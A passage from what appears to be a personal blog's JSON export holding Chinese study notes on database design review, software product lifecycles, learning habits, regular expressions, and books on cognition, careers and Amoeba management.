使用视图规范表记录视图，项目包括：名称，类型，描述，基表，计算字段的表达式，过滤器； 评审视图 确保视图被正确定义； 确保所创建的计算字段适用于该视图； 确保过滤器正常工作； 确保每个视图都有对应的示意图和规范表； 评审数据完整性 表层次完整性 表中无重复字段 表中无计算字段 表中无多值字段 表中无复合字段 表中无重复记录 表中每个记录都通过一个主键识别； 每个主键都满足主键的要素； 字段级完整性 每个字段都符合理想字段的要素； 每个字段都有相应的字段说明 关系层次完整性 建立恰当的关系 建立删除规则 识别每个表的参与类型 识别每个表的参与度 业务规则 每条规则施行有意义的限制 为规则选择合适的类别：字段业务规则，表关系业务规则 正确定义和建立每条规则； 修改适宜的字段说明元素或表关系特征； 建立适用的验证表； 每条规则都有相应的业务规则规范表； 视图 每个视图都包含必要的基表； 每个视图包含合适的字段； 每个计算字段包含相关的信息； 每个过滤器返回适宜的记录； 每个视图都有视图示意图 每个视图都有相应的视图规范表； 汇编数据库文档 字段表列表 字段说明表； 计算字段列表 表结构示意图 关系示意图 业务规则规范表 视图示意图 视图规范表 数据库文档的好处 提供了完整的记录 为实现过程提供了一套规范和操作说明 在实现过程中，如有必要修改数据库结构，可以用于判定修改的影响和结果； 打破规则 两种可能的情况： 设计分析型数据库：以上所有的方法，都是针对操作型数据库，而分析型数据库，应该遵循另外一套方法； 提升处理性能 可能的后果：数据不一致，冗余数据，受损的数据完整性，不准确的信息； 首选的方式 提升硬件性能； 优化操作系统环境； 评审数据库结构：确保设计得当，避免设计欠佳引起的性能问题； 评审数据库实现过程：确保充分利用RDBMS的性能； 评审应用程序： 是否编写正确； 是否充分利用RDBMS的工具； 查询是否规范； 记录行动 如果需要打破规则，则必须记录打破的每条规则和采取的每一步行动，包括如下： 打破规则的原因 违反的设计原理 修改的数据库部分 所做的修改； 对数据库和应用程序的预期影响 记录以上信息的好处有两个，一个是当修改未达到预期效果时，可以恢复原状；一个是为修改留下记录，供后来人理解来龙去脉；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"数据库","slug":"数据库","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"走出软件工坊","slug":"走出软件工坊","date":"2017-05-10T02:15:00.000Z","updated":"2024-09-22T23:08:43.588Z","comments":true,"path":"2017/05/10/走出软件工坊/","permalink":"http://example.com/2017/05/10/%E8%B5%B0%E5%87%BA%E8%BD%AF%E4%BB%B6%E5%B7%A5%E5%9D%8A/","excerpt":"","text":"收获是什么？ 王玉荣，《流程管理》 迈克波特，《竞争战略》 企业级解决方案，《CORBA企业解决方案》 做好版本管理，每个任务的创建和关闭都关联到版本项下，这样版本发布的时候，更新日志也就顺便有了；也方便未来进行追溯； 天天做代码备份，尤其是发布没有把握的功能的时候，先花5分钟将代码备份到另外一台机器上； 组织实施人员写操作帮助说明，一来方便实施，二来也为未来的软件维护交接留下文档； 需求要分类管理，描述清晰； 思考软件的价值在哪里？站在客户的角度，站在管理的角度，站在商业运营的角度，如何量化，有什么模型用来评价？有哪些指标和数据？ 对于企业应用，由于企业是一个组织，它们之间的差异比个人更大，因此，这也注定了企业软件不可能简单适用所有公司，需要抽象成更多类型的版本，高级版，标准版，简化版，来应对不同类型企业客户的需求； 客户内部有三种角色，分别是员工，中层，老板，不同的角色关心点不同，老板关心企业在行业中的生存，现在，未来，布局，机遇和挑战；中层关心考核，业务流程，监督；员工关心操作，简便，省时；对不同的人，讲不同的话，了解对方的需求； 产品的规划要形成整合的竞争力，而不是各个产品各自为战。最理想的状态，是变成消费类产品或者基础类产品；前者是人手一个，后者是成为基础平台，与其他合作伙伴结合，形成生态系统，具备强大的竞争力和高门槛，比如阿里云就是一个很好的例子 产品是有生命周期的，头1-2年是研发的阶段，接下去的3年是实施和改进的阶段，第6-7年是服务和收割的阶段；第8年往后，则是下一个产品周期的开始，因为此时产品已经开始不适应市场竞争了； 软件的第一版需要做什么？需要先能卖，所以重点在于好看和稳定，功能不要多，因为功能一多，实现就需要很长的时间，导致不能很快的上线。当产品上线以后，需求自然会随着用户的使用而不断丰富起来，一开始没有必要将软件做得非常的高大全，而是简而美的最小功能版即可； 在产品生命周期的不同阶段，有各自不同的重点 第一版：最小功能，简而美，稳定，快速上线； 第二版：实施工具，因为销售量开始上来，如果没有实施工具，会涌出各种需求，导致开发资源被大量占用； 第三版：在增加现有功能和稳定性的基础上，使得软件更加易使用和易维护；不加功能，减少复杂性，而是追求客户能够快速理解和上手； 第四版：内部代码的重构优化； 第五版：解决性能问题； 第六版：重构易用，常用功能和不常用功能分开，正常业务和异常业务分开； 第七版：打补丁阶段，大销售大维护大实施的收割阶段，空出来的研发资源开始进入新的产品周期；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"项目管理","slug":"项目管理","permalink":"http://example.com/tags/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86/"}]},{"title":"暗时间","slug":"暗时间","date":"2017-04-29T06:22:00.000Z","updated":"2024-09-22T23:12:51.157Z","comments":true,"path":"2017/04/29/暗时间/","permalink":"http://example.com/2017/04/29/%E6%9A%97%E6%97%B6%E9%97%B4/","excerpt":"","text":"1. 如何学习 实际的投入&#x3D;时间*效率，只有时间，没有效率，等同于没有投入； 原因：大脑需要时间为深入的思考准备环境，在一个成熟的环境中，会进入流体验的思考，得到最大的收获；反之，频繁切换任务则需要付出很多的时间成本在环境搭建上面，一直停留在浅层思考，效率较为低下； 能够迅速进入专注的状态，以及能够长时间保持专注的状态，是高效学习的两个重要习惯； 将大目标转化成小目标，快速频繁，小步迭代的反馈，让自己不会过早的退出； 专注与持之以恒才是稀缺的； 反思是进步的一个重要方法；观察别人的问题容易，反思自己的缺点很难，因此，在观察到别人的问题的时候，要代入自己进行情境思考，如何避免在面对相同情况时，自己出现同样的错误； 能够在使用的时候联想起来的知识，才算学到手；因此，应该关注如何将知识串联起来，形成网络，需要的时候可以顺藤摸瓜，建立知识网络的办法： 为知识创建尽可能多的线索，包括思考其时间，地点，人物，场合 思维方法有：平移，逆向、代入、抽象、关联等； 做法 用自己的语言做总结 把它写下来 讲给别人听 与他人一起交流和讨论 定时回顾 2. 一些观念 别把不知道当作没有，自己想不出来的信息，不代表信息不存在； 不要将时间浪费在选择上面，只要方向不是过于离谱，随便确定一个方向，迅速开始和钻研下去，才是获得积累的好办法。不同的方向最后会殊途同归； 一生的知识积累，自学的起码占90%，这是一个网络的时代，信息获取比以往容易得多，不要辜负了这个美好的时代； 3. 如何保持专注让那些不重要的事情被动的来找自己，据说叫不断式被动关注（其实与番茄工作法的本质相同，当一个番茄钟开始的时候，不让外界干扰打断自己；准备好纸和笔放在旁边，当外界干扰到来的时候，将它在纸上写下来，这样大脑就不会有记忆的负担，然后就会很容易的回到之前的专注状态；如果没有纸笔，大脑则需要分心去记忆这些干扰，此时便会难以保持专注） 4. 一些好的学习习惯 学习和思考 google 和 wikipedia 做读书笔记 只阅读经典书籍 阅读心理学与思维的书籍（了解大脑的工作原理，才能让它更好的工作，并避免陷阱） 带着问题学习 想要解决什么问题？ 我有什么收获？ 我要怎样将收获讲给完全不懂的人听？ 观察自己是如何思考的（复盘自己的思维过程，列出分支，避免在某个分支上卡顿） 反驳自己，质疑自己，寻找更多的可能性； 时间与效率 重要的事情优先，永远先做重要的事情 为重要的事情准备大块的时间段； 利用小块的事情处理一些不那么重要的事情； 重视知识的本质，保持思考事物本质的习惯； 重视积累的力量，不因善小而不为； 经常反思当前最重要的事情是什么，避免因广泛的兴趣而去追逐次重要的事情； 退订消息：真正重要的信息，通过其他来源也会接触到；虽然这个世界每天在发生很多事情，但事物的本质变化很缓慢，与其花时间追逐表层的浪花，不如专注于事物底层的本质； 定期总结自己所学的知识； 通过书籍的阅读，系统的学习某个专题的知识； 制定简要的阅读计划 知识结构 如何甄别好资料与坏资料 前者着重强调事物的本质和理念 后者流于细节 如何有选择性的阅读 问题是什么是？ 方案或结论是什么？ 理由是什么？ 例子是什么？ 如何评估书籍的好坏？ 作者实力水平； 高水平人士的推荐； 看目录和样章； 如何找到好书？ 同一作者的著作； 作者提及和推荐的好书； Amazon 的相关推荐； 5. 思维改变生活 书写的作用 书写可以便于跟别人交流 书写可以跟自己对话 书写可以给大脑提供缓存 书写可以提供备忘 写博客的价值 教是最好的学 能够认识志同道合的朋友 书写可以更好的思考 讨论是反思的契机 激励自己持续学习 博客是一份很好的简历 误区 自利归因：功劳自己占，责任别人担；但世界是复杂的，很多事情甚至有很大的不确定性，事情的发生的原因可能是有多个因素共同作用的结果； 遇到问题寻找捷径是聪明的做法，但只是小聪明；自己动手的收获并不在问题本身，而在于这个过程中牵一而动全身，举一反三，因为问题往往不是孤立的，一个问题的背后，其实是一个认知的网络；","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"心理学","slug":"心理学","permalink":"http://example.com/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"}]},{"title":"正则表达式","slug":"正则表达式","date":"2017-04-04T13:54:00.000Z","updated":"2024-09-22T04:01:17.144Z","comments":true,"path":"2017/04/04/正则表达式/","permalink":"http://example.com/2017/04/04/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","excerpt":"","text":"元字符 \\b 只是匹配开头或结尾的一个位置，而不是代表空格，点，换行符等； 示例：如果要匹配 hi 后面不远处是否有跟着一个单词 Lucy，则可以考虑这么写：\\bhi\\b.*\\bLucy\\b 点“.”可以用来匹配除了换行符以外的任何字符；星号“”代表的是数量，表示星号前面的内容可以连续重复任意次，所以二者合起来的“.*” 表示任意数量的不包含换行的字符；”+” 表示重量1次或更多次，星号可以匹配0次，但加号不行，”\\d+” 表示匹配一个或者多个数字；如果要表示”.” 本身，则需要使用 . \\d 匹配一位数字，0，或1，或2，或3 示例1：0\\d\\d\\d-\\d\\d\\d\\d\\d\\d\\d，表示匹配 0 开头的，接下来3位数字，接着使用横杠连接着，后面接着7位数字的字符串，显然，可以用来表示座机号码，例如 0755-3819783 示例2：示例1的简化版，0\\d{3}-\\d{7} \\w 匹配字母或数字或下划线或汉字 \\s 匹配任意的空白符，包括空格，制表符tab，换行符，中文全角空格等； ^ 匹配字符串的开始；$ 匹配字符串的结束； 示例1 问题：网站要验证输入的 QQ 号是5-12位的 答案：^\\d{5,12}$ 其他： 有些正则表达式的处理工具还有一个处理多行的情况，如果选中了这个选项，则 ^ 和 $ 的含义变成了匹配行的开始处和结束处； 字符转义 因为一些元字符代表了某种特别的含义，但当你想查找它们本身的话，就需要一个特殊的字符斜杠 “&quot; 来取消它们代表的特殊含义； 重复 ? 表示重复一次或零次； {n,} 重复 n 次或者更多次 {n,m} 重复 n 到 m 次； 字符类 方括号可以用来表示整体的字符集 示例1：[aeiou] 表示匹配方括号中5个元音字母的任意一个 示例2：[.?!] 表示匹配方括号中点号、问号、感叹号等3个符号的任意一个 示例3：[0-9] 表示匹配 0 到 9 的任意一个数字，与 \\d 是相同的意思；同理，[0-9a-zA-Z] 则等同于 \\w （如果只考虑英文，不考虑汉字或下划线的话） 示例4：(?0&#x2F;d{2}[) -]?\\d{8}，转义一个左括号，出现1次或不出现，接着2个数字，接着右括号、空格、中横杠 3 个中的 1 个或者不出现，接着 8 个数字； 分枝条件 使用竖线来代表分枝条件，注意顺序很重要，即会先判断左边的分枝是否满足，如果满足，则不再检查右边的分枝；如果不满足，则再检查右边的分枝是否满足； 分组 通过使用括号来对多个字符归成一组，然后可以对整组字符做操作，例如设定重复次数； 括号内的分组，也可以视同一个子表达式； 正则表达式中不能使用数学计算； 反义 \\W，匹配任意不是字母、数字、汉字、下划线的字符； \\S，匹配任意不是空白的字符； \\D，匹配任意不是数字的字符； \\B，匹配任意不是开头或结尾的字符； [^x]，匹配不是 x 的字符； [^aeiou]，匹配不是 aeiou 这5个字符的任意字符； 示例 \\S+，匹配不包含空白字符的字符串； &lt;a[^&gt;]+&gt;，匹配不包含右尖括号的，以 &lt;a 开头，以 &gt; 结尾的字符串； 后向引用 每个分组会有一个组号，从左往右，组号从1开始编号，第一组的组号为1，第二组的组号为2，以此类推；分组 0 则对应整个正则表达式； 组号分析的工作原理，是要扫描两遍的： 第1遍：扫描找出所有未命名的组，给它们依次编号； 第2遍：扫描找出所有已命名的组，给它们依次编号（接着第1遍的编号往下） 因此，所有已命名组的组号都是大于未命名的组的； 给分组命名的两种办法： 办法1：(?&lt;组名&gt;表达式) 办法2：(?’组名’表达式) 通过引用分组号或者分组名，可以重复引用分组捕获的内容 示例：\\b(\\w+)\\b\\s+\\1\\b，此处的\\1表示重复前面的分组(\\w+)捕获的内容； 重复引用的好处是可以让表达式写得更加简洁和易于维护； 当分组有自定义的名称时，引用的办法是：\\k&lt;组名&gt; 常用分组语法： 捕获 (exp)，匹配 exp，并捕获文本到自动命名的组里； (?exp)，匹配 exp，并捕获文本到命名为 name 组里； (?:exp)，匹配 exp，但不捕获文本到自动命名的组里，也不给此分组分配组号； 零宽断言（#好高深的名称，什么鬼？） (?&#x3D;exp)，匹配 exp 前面的位置； (?&lt;&#x3D;exp)，匹配 exp 后面的位置； (?!exp)，匹配后面跟的不是 exp 的位置； (?&lt;exp)，匹配前面跟的不是 exp 的位置； 注释 (?#注释内容)，表示一个注释，仅阅读，不产生任何作用或副作用； 零宽断言 (?&#x3D;exp)，零宽度正预测先行断言，它断言自身出现位置的后面，能匹配表达式 exp 示例：\\b\\w+(?&#x3D;ing\\b)，匹配以 ing 结尾的单词的前面部分 I’m singing while you’re dancing 匹配 sing 和 danc (?&lt;&#x3D;exp)，零宽度正回顾后发断言，它断言自身出位位置的前面，能匹配表达式 exp 示例：(?&lt;&#x3D;\\bre)\\w+\\b，匹配以 re 开头的单词的后面部分； reading a book 匹配 ading 其他 断言用来声明一个应该为真的事实，正则表达式中只有断言的结果为真时，才会继续进行匹配；如果断言不为真，则匹配终止； (?&lt;&#x3D;\\s)\\d+(?&#x3D;\\s)，匹配以空白字符间隔的数字； 负向零宽断言（这个翻译真垃圾，或许应该叫：匹配不包含表达式指定的内容） (?!exp)，断言此位置的后面不能匹配表达式 exp 示例：\\d{3}(?!\\d)，匹配3个数字，且后面不能再跟着数字； 示例：\\b((?!abc)\\w)+\\b，不包含连续字符串 abc 的单词； 与[^exp] 的区别：[^exp] 会消费一个字符进行判断，而 (?!exp) 不会 (?&lt;!exp)，断言此位置的前面不能匹配表达式 exp 示例：(?&lt;![a-z])\\d{7}，匹配不以小写字母开头的7位数字； 示例：(?&lt;&#x3D;&lt;(\\w+)&gt;).*(?&#x3D;&lt;/&#x2F;1&gt;)，匹配不包含属性的简单 html 里面的内容； 不管是零宽断言，还是负向零宽断言，它都表示所断言的是其位置前后的情况，其本身不包含前后的内容； 注释 语法：(?#注释内容) 示例：2[0-4]&#x2F;d(?#200-249)|250-5|[01]?\\d\\d?(?#0-199) 建议启用选项”忽略模式里面的空白符，好处是：可以在注释中，随意添加空白符，例如空格、换行、TAB等，这些空白符都会被忽略不执行； 示例 (?&lt;&#x3D; # 断言要匹配的文本的前缀） &lt;(\\w+)&gt; # 查看尖括号括起来的字母或数字，即 html&#x2F;xml 标签； ) # 前缀结束 .* # 匹配任意文本 (?&#x3D; # 断言要匹配的文本的后缀） &lt;/&#x2F;1&gt; # 查找尖括号括起来的内容，其中前面一个字符是”&#x2F;“，后面是先前分组捕获的内容 ) # 后缀结束 贪婪与懒惰 正常情况默认是贪婪匹配，即能够满足条件下匹配尽可能多的字符； 懒惰匹配则是能满足条件下匹配尽可能少的字符； 示例 a.*b，匹配以 a 开头，以 b 结尾的字符串，例如匹配 aabab，会得到整个字符串 a.*?b，匹配以 a 开头， 以 b 结尾的字符串，但使用最少的重复，例如匹配 aabab，会得到 aab 和 ab 两个字符串 懒惰限定符 *?，重复任意次，但尽可能少重复 +?，重复1次或任意次，但尽可能少重复； ??，重复0次或1次，但尽可能少重复 {n,m}?，重复 n-m 次，但尽可能少重复； {n,}?，重复 n 次以上，但尽可能少重复； 平衡组&#x2F;递归匹配 思路： 从最左边开始，每找到一个左括号，将捕获的内容命名为 group，压入栈，直到将所有左括号找完； 每找到一个右括号，从栈中弹出一个组 group 如果堆栈上存在 group 的捕获内容，则执行匹配 yes 的表达式；如果不存在 group，则执行匹配 no 的表达式； 平衡组常用的一个应用是匹配 html 标签，例如嵌套的 标签 不同的语言&#x2F;库可能不一定支持此功能，或者支持此功能但使用的语法可不同 python 中 re 模块的一些处理函数 re.match 作用：匹配字符，如果成功则返回 Match，如果失败则返回 None 示例： text &#x3D; ‘John is a handsome boy, he is clever, cool, and so on.’ m &#x3D; re.match(r”(\\w+)\\s”, text) 释义 函数原型：re.match(pattern, string, flags) 第一个函数是要匹配的内容，第二个是字符串，第三个控制参数，例如区分大小写、多行匹配等 re.search re.sub re.split re.findall re.compile","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"DSL","slug":"DSL","permalink":"http://example.com/tags/DSL/"}]},{"title":"思考，快与慢","slug":"思考，快与慢","date":"2017-04-02T07:08:00.000Z","updated":"2024-09-22T23:11:18.339Z","comments":true,"path":"2017/04/02/思考，快与慢/","permalink":"http://example.com/2017/04/02/%E6%80%9D%E8%80%83%EF%BC%8C%E5%BF%AB%E4%B8%8E%E6%85%A2/","excerpt":"","text":"1. 序言 部分一：通过双系统进行判断和做出决策的基本原理 部分二：判断启发法和为什么缺乏统计型思维； 部分三：大脑的局限，低估自己的无知和世界的偶然性； 部分四：关于经济决策的原则； 部分五：关于两个自我：经验自我和记忆自我； 部分六：三个区别，经验自我与记忆自我，古典经济学和行为经济学，系统1和系统2； 第1章 一张愤怒的脸和一道乘法题 系统1的运行是无意识且快速的，不怎么费脑力，没有感觉，完全自主控制的状态 系统2将脑力转移到需要费脑力的大脑活动上，需要集中注意力，若注意力涣散，运作即中断； 系统1和系统2有分工，前者遇到麻烦时，后者开始出面解决；这种分工很高效，最小的代价取得最好的效果； 系统1的缺陷 对于逻辑学和统计学几乎一无所知； 我们无法关闭它； 自主反应和控制这种反应的意图之间存在冲突； 系统2负责人们的自我控制； 让系统2时时保持警觉并不合算，可行性也很低；妥协的做法：只在可能出现重大决策或问题情境，即决策风险很高的时候，以尽力避免错误； 系统1和系统2只是一种虚拟角色，为方便描述大脑运作的方式而使用； 任何事物占用了大脑的工作记忆，都会削弱你的思考能力（因此好记忆不如烂笔头，减少大脑的记忆负担，释放内存，让其可以有容易做更复杂的判断） 第2章 电影的主角与配角 虽然系统2认为自已选择了人们的想法和行为，但实际这些选择都是在系统1的引导下完成的；系统1才是故事的真正的主角； 系统2大部分时候都在散步，有时候会变成慢跑，偶尔才会冲刺； 当系统2在冲刺状态的时候，有可能会屏蔽掉一些次要信息； 如果大脑的使用超负荷，其处理会是有选择性且精确性，它会将注意力优先分配在最重要的事情上，之后如有余力，再慢慢分配到将要的事情上面； 当对一个任务越来越熟悉的时候，需要付出的努力程度就会降低； 最活力法则：如果达到一个目标的方法有多种，人们往往选择最简单的那一种（估计这也是人们很少去做刻意练习的原因，因为那是一种不愉快的体验，需要让大脑处于紧张的状态）； 系统2是一个可以按规则、能根据属性来对比物品、能深思熟虑作出选择的系统；系统1不行； 系统2可以提取记忆去执行抑制习惯性反应的指令； 大脑从一个任务转换到另外一个任务需要付出努力，在时间紧迫的情况下尤其如此； 第3章 惰性思维与延迟满足的矛盾 大多数人保持连贯的思维或时不时积极思考需要自我控制力； 心流体验区分了两种努力形式：对任务的关注和对注意力的控制；集中注意力关注吸引人的事并不要示自我控制； 系统2在忙碌时，系统1对行为的影响会更大，即此时人更容易屈服于诱惑； 自我损耗：刻意掌控意志和进行自我控制很辛苦，如果你必须强迫自己去做某件事，而此时这件事又面临一个新的挑战，你就会很不情愿或是根本无法进行自我控制； 自我损耗的影响能够通过葡萄糖得到缓解，因为大脑需要消耗大量的葡萄糖 儿童控制其注意力的能力和控制其情感的能力之间有着紧密的联系； 高智商并不能消除成见，具备“理性”的能力才能消除成见，即成为思考的“勤快人”，谨慎的对待自己的直觉，有自我怀疑的习惯； 第4章 联想的神奇力量 人不只是用大脑在思考，还用身体思考（身体会对意识做出反应，包括潜意识） 观点之间的联结类型有：因果关系、事情及其特性的关系、事物及其种类的关系； 你觉得很了解自己，但其实你错了； 启动效应：出现一个概念，会像池塘里的涟漪一样引发一系列的概念； 人的行为和感情有时会受制于你自己甚至都没有意识到的事件； 概念运动效应：概念会影响行为；你会接受或正在思考的概念，会影响你接下来的一些行为表现；例子：微笑的铅笔； 通过控制人们接触到的事物或概念，会影响人们的想法和行为；例子：金钱、上帝、礼仪、领袖像；以及麦克白效应； 第5章 你的直觉有可能只是错觉 放松的原因：反复的体验、清楚的示范、预知的想法、好心情 放松的结果：感到熟悉、感觉真实、感觉良好、感觉不费力； 由记忆造成的错觉：熟悉感有简单而又强烈的“不可复返性”； 这种不可复返性的一大特性便是错觉；熟悉会使得我们更短的时间对事物进行识别，从而感到认知放松； 如果某个判断是基于认知放松或认知紧张做出的，那就一定会造成错觉； 任何能使联想机制运行更轻松、更顺利的事物都会使我们心生偏见 想让人们相信谬误有个可靠的办法：那就是不断的重复，因为人们很难对熟悉感和真相加以区别； 任何缓解认知紧张的做法，都会对让人们相信信息是真实的有所帮助；比如字迹更加清楚、信息更加简洁，易于记忆 认知紧张会触发系统2参与信息处理，从而也比较不容易犯低级错误； 曝光效应：重复能引发放松状态和令人舒心的熟悉感（生物进化认识安全就是好的） 重复曝光构成了社会组织和社会整合的基础，而社会组织与社会整合又是心理稳定和社会稳定的基础； 创新是极佳的联想记忆； 当人们认知放松的时候，直觉和创造力会增强； 第6章 意料之外和情理之中 系统1的主要功能是维护并更新个人世界的模式，它呈现的都是常态下的思维模式；因此，系统对违反常态的问题的察觉速度是惊人的；察觉过程也是微妙的； 第一次是惊喜，第二次就会逐渐变成常态； 系统1长于因果关系的归纳，虽然它可能经常是不正确的； 第7章 字母“B”与数字“13” 我们对事物的解读跟上下文有关系， 在没有清晰情境的情况下，系统1会自动建立一个情境； 当人们劳累或者精力耗尽时，更容易受那些空洞却有说服力的信息影响，例如广告 联想记忆的运作是导致“确认偏误”的原因之一；例子：“Sam友好吗？”与“Sam是不是很不友好？” 系统1可以通过很多比现实更简单却更连贯的方式来表现这个世界，光环效应即是其中之一 光环效应注重第一印象，因此信息出现的顺序变得重要，后续信息在很大程度上可能会被消解掉了； 消除光环效应的一个原则是：消除错误的关联，例如每个个体进行独立的观察 系统1注重于它所创造的情境是否具有连贯性，而不注重所需数据的数量和质量； 眼见即为事实的理念有助于达成连贯性和认知放松的状态，从而使我们相信某个陈述是真实的；一些后果：过于自信、框架效应（90%存活率比10%死亡率更让人安心）","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"心理学","slug":"心理学","permalink":"http://example.com/tags/%E5%BF%83%E7%90%86%E5%AD%A6/"}]},{"title":"优秀到不能被忽视","slug":"优秀到不能被忽视","date":"2017-03-29T14:02:00.000Z","updated":"2024-09-22T23:11:41.692Z","comments":true,"path":"2017/03/29/优秀到不能被忽视/","permalink":"http://example.com/2017/03/29/%E4%BC%98%E7%A7%80%E5%88%B0%E4%B8%8D%E8%83%BD%E8%A2%AB%E5%BF%BD%E8%A7%86/","excerpt":"","text":"1. 规则一：不要追随自己的激情 技能的精通是需要时间的，这才是最难的部分；各个行业都一样，重点在于，用正确的方法和最短的时间渡过这个时期，积累职场资本； 职业激情是稀缺的：只有4%不到的激情跟工作或教育相关，其余96%都只是某种爱好或兴趣，即不能创造可交换价值的活动； 激情需要时间 激情是精通的副产品； 获得动机需要满足的三种基本心理需求 自主：感觉对自己的生活拥有控制力，并感觉自己的所作所为是重要的； 胜任：感觉自己擅长于自己所做的事情 归属：感觉自己能够与他人建立联系 2. 规则二：工匠思维胜过激情思维 工匠思维：以产出为中心的职业观，关注自己给世界带来的价值 职场资本：个人所拥有的、在职场中属于稀缺而宝贵的技能；这是创建自己热爱的工作的关键通货； 成就大事的特质稀缺而宝贵，想获取这些特质，需要提供稀缺而宝贵的技能作为交换； 不适用工匠思维的三条特征 该工作无法让你发展稀缺而宝贵的技能从而与他人区别开； 该工作所关注的内容是无用的或者可能对世界有害； 该工作迫使自己与非常不喜欢的人在一起工作； 刻意的练习以跨越绩效高原：伟大的成就不在于天赋，而在于在正确的时间，正确的地点积累如此大的练习量； 刻意练习：通常由一位老师设计的，以有效改善某一个体某方面表现的唯一目的的活动；它要求将自身能力拓展到舒适范围以外，然后不断接收反馈； 假设只是努力工作，很快便会来到一个绩效高原，之后便无法取得任何进步； 投身于刻意练习之中，拓展能力范围，不断寻求反馈； 绩效高原：大多数一开始就活跃于专业领域的个体都会在有限的时间内改变自己的行为并且提升自己的绩效，直到达到某种可以接受的水平；在此之后，进一步的改善无法预知，而工作年数不足以预测一个人所能达成的绩效； 把时间花在重要的事情上面，而不是紧急的事情上面； 刻意练习的5大步骤： 判断自己身处哪一种职场资本市场 赢者通吃型：只有一种职场资本可以获取，并且很多不同的人在争夺这种资本； 拍卖型：有很多不同类型的职场资本，并且每个人可以生成他们自己独有的资本； 识别出自己要追寻的资本类型 定义优秀：需要有明确的目标，如果不知道目标，就很难采取措施； 拉伸与摧毁 拉伸：突破自己的舒适范围，进行严肃的刻意练习； 摧毁：积极接收真诚的反馈； 要有耐性：职场资本的获取需要时间； 3. 规则三：幸福来自于自主力 自主才是大家真正追求的东西；它是稀缺的，需要通过职场资本来换取； 自主力：对自己的工作内容和工作方式拥有发言权； 通过在工作内容和工作方式上赋予人们更多的自主力，会提高人们的幸福感、投入程度以及满足感 自主力陷阱一：自主力若不以职场资本而取得，则不具备可持续性； 自主力陷阱二：当你拥有足够的职场资本获取对职业生涯的合理控制时，雇主会设法阻碍你争取自主力； 信守财务可行性法则（要做有人愿意埋单的事情）：在决定是否追求某项有吸引力的活动时，应该问问自己别人是否愿意为之埋单；如果愿意，就继续追求；如果不愿意，就维持现状； 4. 规则四：使命感带来意义 使命：在创建自己热爱的工作时需要靠职场资本获取的另一个重要特质；它回答了“我的人生应该怎么度过”的问题，能够使你将时间都集中在有用的目标之上 相邻可能：在任何领域，下一个伟大的创意通常就出现在当前发展前沿之外的相邻区间，而这个区间包含了对现有想法的各种可能的新组合。关键是：你必须达到某一领域的前沿，然后，这种相邻可能以及它所包含的创新才会显现； 达到某一领域的前沿水平，需要在相当长的一段时间内专注于很少的几个课题。然而，一旦达到了前沿并且在相邻可能中到了一项使命，那么必须以极大的热情去追求它； 许多有着大量职场资本的人都可以在工作中找到很多不同的潜在使命，但却很少有人围绕这些使命建立自己的事业。要想运用好使命，仅仅达到前沿还不够，还需要善用“小赌”； 小赌：不一定要以一项伟大的创意开始，或者事先做好全盘规划，而是通过一系列有条不紊的“小赌”探索出一个可能不错的方向，并且从大量的小失误以及那些意义重大的小成功中汲取关键信息； 如果说职场资本能够让人找到一项有吸引力的使命，那么正是“小赌”策略让这项使命的成功实现成为可能； 要么引人注目，要么默默无闻：想要打造一份可以持续发展的事业，必须生产“紫牛”，即引人注目而且能够迫使人们广为传播的项目； 引人注目法则 迫使接触过它的人向他人进行评论； 它必须在一个利于这种评论发生的场合启动； 5. 正确地工作胜过正确的工作不要执迷于寻找自己真正的“天职”，而要去掌握稀缺而宝贵的技能。一旦你积累到了这些技能所产生的职场资本，就要明智地运用好它。你可以用它来获取在工作内容和工作方式上的自主力，以及用来找到并实践某项改变人生的使命","categories":[{"name":"社科","slug":"社科","permalink":"http://example.com/categories/%E7%A4%BE%E7%A7%91/"}],"tags":[{"name":"管理","slug":"管理","permalink":"http://example.com/tags/%E7%AE%A1%E7%90%86/"}]},{"title":"阿米巴经营","slug":"阿米巴经营","date":"2017-03-28T02:55:00.000Z","updated":"2024-09-22T23:13:28.122Z","comments":true,"path":"2017/03/28/阿米巴经营/","permalink":"http://example.com/2017/03/28/%E9%98%BF%E7%B1%B3%E5%B7%B4%E7%BB%8F%E8%90%A5/","excerpt":"","text":"序言 几个关键点 转变意识，转变认知 正确设置企业的成本中心和利润中心 合理的定价机制：内部交易（制造业），合作对价（服务业） 内部实行经营的透明化和公开化 前言 自己的努力能够迅速地通过数字反映出来，这是阿米巴经营的一个要点 人的潜力是无限的，很多企业并没有将这种潜力最大限度的活用； 阿米巴经营是一种怎样的经营手法 为了实现全员参与的经营 在你的公司里，谁在创造利润 阿米巴经营的三个特点 非常小的组织进行独立结算 收支决算采用“单位时间结算” 及时准确的经营信息 阿米巴的经营指标 销售部门 销售手续费-经费&#x3D;差额收益 销售手续费（赚到的钱）&#x3D;销售额*佣金率 经费（花掉的钱） 差额收益（获得的利润） 差额收益&#x2F;总劳动时间&#x3D;单位时间附加价值； 生产部门 生产总额-经营&#x3D;差额收益 差额收益&#x2F;总劳动时间&#x3D;单位时间附加价值（每小时的附加价值大小） 通过公司内部交易来实现阿米巴的独立核算管理 经费 由原材料费用，外包加工费，电费等直接费用，和总公司经营，工厂经费，销售手续费以及利息费用等间接费用组成 人工费不包含在经营里面，避免每个人的工资额度被公开 将对利润负责的部门明确化，并引导企业全体员工共同努力实现利益最大化； 管理会计和财务会计的关系：差人工费，扣去后即是财务的税前利润 论语和算盘必须一致 没有道德的经济是一种罪恶，没有经济的道德是一种空想； 在追求全体员工物质和精神两方面幸福的同时，为人类社会的进步和发展做出自己的贡献； 一一对应，双重核查 经营管理部门与财务部门一起对货物、金额和票据进行一对一的核实，检查它们是不是货票一致； 导入阿米巴经营的基本思考方法 